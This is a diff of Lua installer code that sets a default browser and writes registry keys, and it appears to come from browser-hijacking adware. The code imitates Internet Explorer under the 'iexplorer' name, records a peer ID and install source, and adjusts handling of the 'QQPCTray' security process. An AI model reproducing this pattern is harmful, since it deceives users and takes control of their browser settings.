@@ -523,6 +523,7 @@ end
 
 
 function TrySetDefaultBrowser()
+	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
 	local strIEPath = GetIEPath()
 	if not IsRealString(strIEPath) or not tipUtil:QueryFileExists(strIEPath) then
 		return
@@ -635,7 +636,7 @@ end
 
 function GetBlackListForIE(strIniPath)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	local tBlackList = {"QQPCTray"}
+	local tBlackList = {}
 	local strBlackList, bRet = tipUtil:ReadINI(strIniPath, "entrytype", "blacklist")
 	if not bRet or not IsRealString(strBlackList) then
 		return tBlackList
@@ -693,22 +694,23 @@ end
 
 function WriteIERegister()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local bIs64 = FunctionObj.CheckIs64OS()
 	
 	local strIEPath = GetIEPath()
 	tipUtil:CreateRegKey("HKEY_CURRENT_USER","SOFTWARE\\iexplorer")
-	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path", strIEPath)
+	bret = FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path", strIEPath, bIs64)
 	
 	local strPid = FunctionObj.GetPeerID()
-	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\PeerId", strPid)
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\PeerId", strPid, bIs64)
 	
 	local strInstallSrc = FunctionObj.GetInstallSrc()
-	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstallSource", strInstallSrc)
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstallSource", strInstallSrc, bIs64)
 	
 	local strInstallDir = GetIEDir()
-	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstDir", strInstallDir)
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstDir", strInstallDir, bIs64)
 	
 	local strCurrentTime = tipUtil:GetCurrentUTCTime()
-	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstallTimes", strCurrentTime)
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstallTimes", strCurrentTime, bIs64)
 	
 	-------
 	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe")
@@ -995,7 +997,7 @@ function CreateDesktopShortCut(strIniPath)
 		return 
 	end
 		
-	local tShortCutList = {}
+	local tShortCutList = {"QQPCTray"}
 	local strShortCutList, bRet = tipUtil:ReadINI(strIniPath, "entrytype", "shortcutlist")
 	if bRet and IsRealString(strShortCutList) then
 		tShortCutList = FunctionObj.SplitStringBySeperator(strShortCutList, ",")
